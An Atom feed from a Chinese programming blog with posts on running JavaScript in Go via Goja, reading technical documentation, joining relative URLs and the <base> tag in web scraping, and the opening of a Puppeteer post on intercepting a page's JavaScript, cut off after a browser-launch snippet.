<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>谢乾坤 | Kingname</title>
  
  <subtitle>给时光以生命。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.kingname.info/"/>
  <updated>2022-01-18T13:07:46.000Z</updated>
  <id>https://www.kingname.info/</id>
  
  <author>
    <name>谢乾坤 | Kingname</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>一日一技：在 Golang 中运行 JavaScript</title>
    <link href="https://www.kingname.info/2022/01/18/run-js-in-golang/"/>
    <id>https://www.kingname.info/2022/01/18/run-js-in-golang/</id>
    <published>2022-01-18T13:07:01.000Z</published>
    <updated>2022-01-18T13:07:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>我们知道，在 Python 里面，如果你要运行一段 JavaScript，你可以使用<code>execJS</code>这种第三方库。那么在 Golang 里面，你想运行 JavaScript 的时候又应该怎么办呢？</p><p>最近我发现一个使用 Golang 开发的 JavaScript 引擎：<a href="https://github.com/dop251/goja" target="_blank" rel="noopener">Goja</a>。它实现了<code>ES 5.1</code>的所有语法和大部分的<code>ES 6</code>语法，比 Python 的<code>execJS</code>要厉害得多。在一定程度上和特定场景下，它可以完全替代Chrome 的 V8引擎。</p><a id="more"></a><p>我们来看看如使用它运行一段 JavaScript 代码。首先，我来写一段递归版的 JavaScript 代码计算斐波那契数列：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fib</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n === <span class="number">1</span> || n === <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fib(n - <span class="number">1</span>) + fib(n - <span class="number">2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接在浏览器上面运行的效果如下：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220118194307.png" alt></p><p>现在，我们来安装这个<code>Goja</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get github.com/dop251/goja</span><br></pre></td></tr></table></figure><p>接下来我们在 Go 中运行 js 代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line">    <span class="string">"github.com/dop251/goja"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> script = <span class="string">`</span></span><br><span class="line"><span class="string">    function fib(n) &#123;</span></span><br><span class="line"><span class="string">        if (n === 1 || n === 2) &#123;</span></span><br><span class="line"><span class="string">            return 1 </span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        return fib(n - 1) + fib(n - 2)</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    `</span></span><br><span class="line">    vm := goja.New()</span><br><span class="line">    _, err := vm.RunString(script)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">"JS代码有问题！"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> fn <span class="function"><span class="keyword">func</span><span class="params">(<span class="keyword">int32</span>)</span> <span class="title">int32</span></span></span><br><span class="line">    err = vm.ExportTo(vm.Get(<span class="string">"fib"</span>), &amp;fn)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">"Js函数映射到 Go 函数失败！"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(<span class="string">"斐波那契数列第30项的值为："</span>, fn(<span class="number">30</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220118195256.png" alt></p><p>我们来解释一下上面代码的意思。请大家关注截图中的代码行号。第19行，我们创建了一个 JavaScript 的虚拟机。然后在第20行，把这个函数加载到了虚拟机当中。</p><p>第25行，我们创建了一个变量，这个变量是函数类型，这个函数接收一个 <code>int32</code>作为参数，并返回另一个<code>int32</code>类型的数据。</p><p>第26行，我们把 Golang 里面的这个函数变量与 JavaScript 里面的函数<code>fib</code>关联起来，这样我们就能直接写 Go 代码来调用 JavaScript 代码了。</p><p>第31行，我们像调用普通的 Go 函数一样传入参数，然后获得结果。</p><p>有一些同学在做爬虫的时候，需要运行一段 JavaScript 代码来生成一段 token，那你不妨试一试<code>Goja</code>，它的速度肯定要比你用Python 版本的快很多。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我们知道，在 Python 里面，如果你要运行一段 JavaScript，你可以使用&lt;code&gt;execJS&lt;/code&gt;这种第三方库。那么在 Golang 里面，你想运行 JavaScript 的时候又应该怎么办呢？&lt;/p&gt;
&lt;p&gt;最近我发现一个使用 Golang 开发的 JavaScript 引擎：&lt;a href=&quot;https://github.com/dop251/goja&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Goja&lt;/a&gt;。它实现了&lt;code&gt;ES 5.1&lt;/code&gt;的所有语法和大部分的&lt;code&gt;ES 6&lt;/code&gt;语法，比 Python 的&lt;code&gt;execJS&lt;/code&gt;要厉害得多。在一定程度上和特定场景下，它可以完全替代Chrome 的 V8引擎。&lt;/p&gt;
    
    </summary>
    
      <category term="Golang" scheme="https://www.kingname.info/categories/Golang/"/>
    
    
      <category term="JavaScript" scheme="https://www.kingname.info/tags/JavaScript/"/>
    
      <category term="Golang" scheme="https://www.kingname.info/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：如何阅读技术文档（直播文案）</title>
    <link href="https://www.kingname.info/2022/01/18/how-to-read-doc/"/>
    <id>https://www.kingname.info/2022/01/18/how-to-read-doc/</id>
    <published>2022-01-18T13:05:46.000Z</published>
    <updated>2022-01-18T13:06:45.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p> 今天这篇文章，是我今天（1月16日）知识星球直播的概要。详细内容，大家可以观看直播回放视频。已经在知识星球的同学，直接点击连接就能查看回放。尚未加入星球的同学，请在一周后，到我的B站上观看视频。</p></blockquote><a id="more"></a><p>我平常在公众号粉丝群里面常说，要多看官方文档，少看博客。有些同学就说，官方文档看不懂啊。例如你想学习Python的logging模块，然后你会看到<a href="https://docs.python.org/zh-cn/3/library/logging.html" target="_blank" rel="noopener">logging — Python 的日志记录工具 — Python 3.10.2 文档</a>是下面这样的：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220116174433.png" alt></p><p>又比如你想学习Golang里面<code>net/http</code>的使用，你会看到它的文档<a href="https://pkg.go.dev/net/http" target="_blank" rel="noopener">http package - net/http - pkg.go.dev</a>是这样的：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220116174611.png" alt></p><p>这样的文档，你看完以后，可能也写不出一个完整的可以运行的程序。但还有另一种文档，你就算第一次接触这个软件或者框架，你也能跟着它的指导写代码，例如Scrapy的官方教程<a href="https://docs.scrapy.org/en/latest/intro/tutorial.html" target="_blank" rel="noopener">Scrapy Tutorial — Scrapy 2.5.1 documentation</a>。你甚至不会英语也没关系，你就跟着黄绿背景的框框写命令，复制代码，你也可以把爬虫搞出来。</p><p>为什么会有这样的差异呢？因为我们平常笼统地叫做<code>文档</code>的东西，其实有两种。前两个反例是<code>API Reference</code>，API接口文档。Scrapy的叫做<code>教程</code>。API接口文档和教程文档是面向两种不同用途的。</p><p>Python的Logging模块也有教程文档版：<a href="https://docs.python.org/3/howto/logging.html#logging-howto" target="_blank" rel="noopener">Logging HOWTO</a>。</p><p>教程文档其实没有什么好说的，就是一步一步跟着走就能完成。教程文档会告诉你，<code>你不知道你不知道</code>的东西。</p><p>而API接口文档看起来就会比较费劲，因为它是用来告诉你<code>你知道你不知道</code>的东西。例如你知道有某个功能某个函数，但是你不知道它的具体语法怎么写，这个时候就用API接口文档。</p><p>在直播里面，我以Scrapy下载器中间件和Pyppeteer为例来进行说明。我知道下载器中间件怎么激活，我也知道我要修改代理IP，应该编写下载器中间件的<code>process_request</code>方法，但是这个方法接受哪些参数？它能返回什么东西？这个时候我就可以到API接口文档里面进行查询。</p><p>同理，在Pyppeteer的Github仓库里面，Readme写了两个简单的例子告诉我怎么使用它打开一个网页。但是我应该怎么使用XPath从页面上选中一个元素，然后点击它？这个时候就可以到API接口文档里面，搜索<code>xpath</code>，找到对应的方法，看它接受什么参数，返回什么内容，会报什么错。</p><p>直播的最后，我和大家一起试图从<code>net/http</code>的API文档里面寻找怎么更换代理IP。由于我用Go发起网络请求，主要是使用<code>imroc/req</code>，很少使用<code>net/http</code>，我处于<code>我不知道我不知道</code>的状态，于是我跟大家一起崩溃在了这个API接口文档里面。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt; 今天这篇文章，是我今天（1月16日）知识星球直播的概要。详细内容，大家可以观看直播回放视频。已经在知识星球的同学，直接点击连接就能查看回放。尚未加入星球的同学，请在一周后，到我的B站上观看视频。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="经验" scheme="https://www.kingname.info/categories/%E7%BB%8F%E9%AA%8C/"/>
    
    
      <category term="经验" scheme="https://www.kingname.info/tags/%E7%BB%8F%E9%AA%8C/"/>
    
      <category term="直播" scheme="https://www.kingname.info/tags/%E7%9B%B4%E6%92%AD/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：拼接个URL你也能搞错，还写个屁的爬虫。</title>
    <link href="https://www.kingname.info/2022/01/18/relative-url/"/>
    <id>https://www.kingname.info/2022/01/18/relative-url/</id>
    <published>2022-01-18T13:04:25.000Z</published>
    <updated>2022-01-18T13:05:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>在写爬虫的过程中，我们经常需要解析网站的列表页。</p><a id="more"></a><p>例如下面这个例子：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试相对路径<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>书籍列表<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://127.0.0.1:8000/book/1.html"</span>&gt;</span>第一本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://127.0.0.1:8000/book/2.html"</span>&gt;</span>第二本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://127.0.0.1:8000/book/3.html"</span>&gt;</span>第三本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://127.0.0.1:8000/book/4.html"</span>&gt;</span>第四本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://127.0.0.1:8000/book/5.html"</span>&gt;</span>第五本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220107185621.png" alt></p><p>这种情况下，我想获取每一项的URL非常简单，直接写一个XPath就可以了，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220107185741.png" alt></p><p>仔细观察你会发现，每一个连接的URL都是以<code>http://127.0.0.1:8000</code>开头的。而当前列表页的地址也是<code>http://127.0.0.1：8000</code>。所以为了简单起见，<code>&lt;a&gt;</code>标签里面可以使用相对路径：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试相对路径<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>书籍列表<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/book/1.html"</span>&gt;</span>第一本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/book/2.html"</span>&gt;</span>第二本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/book/3.html"</span>&gt;</span>第三本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/book/4.html"</span>&gt;</span>第四本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/book/5.html"</span>&gt;</span>第五本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行效果如下图所示，用XPath只能提取到半截URL：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220107190417.png" alt></p><p>但是浏览器可以正确识别这样的相对地址，并且当你点击的时候，它能自动跳转到正确的地址：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220107190616.png" alt></p><p>相对路径如果是以<code>/</code>开头，那么就会在相对路径前面拼接上网站的主域名。</p><p>但如果当前列表页的地址跟链接的相对路径有一部分重叠怎么办？如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220107190934.png" alt></p><p>当前页面的地址是<code>http://127.0.0.1:8000/book</code>。而相对地址是<code>/book/1.html</code>。这种情况下，还可以进一步简化，在相对路径的前面不要加斜杠，把HTML改成：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试相对路径<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>书籍列表<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"1.html"</span>&gt;</span>第一本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"2.html"</span>&gt;</span>第二本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"3.html"</span>&gt;</span>第三本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"4.html"</span>&gt;</span>第四本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"5.html"</span>&gt;</span>第五本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220107191249.png" alt></p><p>这种情况下，浏览器依然能给正确识别，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220107191347.png" alt></p><p>浏览器知道，如果相对路径没有用<code>/</code>开头，那么它就会把当前页面的URL与相对路径拼接起来。但需要注意的是，在拼接的时候，会取最右侧斜杠左边的部分。而右边的部分会丢弃。就相当于拼接文件地址的时候，用这个文件所在的文件夹来拼接新的地址。如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220108203350.png" alt></p><p>如果你记不住怎么区分的话，你可以使用Python自带的<code>urllib.parse.urljoin</code>来连接，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220108203722.png" alt></p><p>看到这里，你可能觉得我今天又水了一篇文章。这么简单的东西也值得写一篇文章来讲？</p><p>那么我们来看下面这个例子：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220108204350.png" alt></p><p>域名是<code>http://127.0.0.1:8000/book/index.html</code>，相对域名是<code>1.html</code>，但为什么浏览器自动识别出来的URL是<code>www.kingname.info/1.html</code>？</p><p>这个问题的关键，在于源代码里面的<base>标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试相对路径<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"http://www.kingname.info"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>书籍列表<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"1.html"</span>&gt;</span>第一本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"2.html"</span>&gt;</span>第二本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"3.html"</span>&gt;</span>第三本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"4.html"</span>&gt;</span>第四本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"5.html"</span>&gt;</span>第五本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果HTML代码头部有<base>标签，那么，它的<code>href</code>属性的值，会被用来跟相对路径拼接出一个绝对路径，而不会再用当前页面的URL来拼接。</p><p>如果你不知道这一点的话，你的爬虫在拼接子页面URL的时候可能就会出问题。网站也可以使用这个机制构造出一个蜜罐，根据<base>标签拼出来的URL才是真正的子页面地址，而用当前页面URL去拼接的URL是蜜罐地址，爬虫访问进去以后，就会抓到假数据，或者被立即屏蔽。</p><p>关于<base>标签的详细说明，大家可以阅读：<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base" target="_blank" rel="noopener"><base>: The Document Base URL element</a>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在写爬虫的过程中，我们经常需要解析网站的列表页。&lt;/p&gt;
    
    </summary>
    
      <category term="爬虫" scheme="https://www.kingname.info/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://www.kingname.info/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：在 Puppeteer 中如何拦截并修改网站的 JavaScript 代码</title>
    <link href="https://www.kingname.info/2022/01/18/mitm-in-puppeteer/"/>
    <id>https://www.kingname.info/2022/01/18/mitm-in-puppeteer/</id>
    <published>2022-01-18T13:03:20.000Z</published>
    <updated>2022-01-18T13:04:07.000Z</updated>
    
    <content type="html"><![CDATA[<p>在我的爬虫书中，讲到了使用 Charles 或者 MitmProxy 实现中间人攻击，从而绕过反爬虫机制的方法。但这两种方法都需要安装根证书。</p><p>今天，我们来试一试在 Puppeteer 中，使用中间人攻击，攻击目标是我们自己，来绕过反爬虫机制。</p><a id="more"></a><p>首先，我们用以下代码访问网站<code>http://exercise.kingname.info/exercise_ajax_1.html</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">'puppeteer-core'</span>);</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(&#123;</span><br><span class="line">        executablePath: <span class="string">'/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge'</span>,</span><br><span class="line">        headless:<span class="literal">false</span>,</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> [page] = <span class="keyword">await</span> browser.pages()</span><br><span 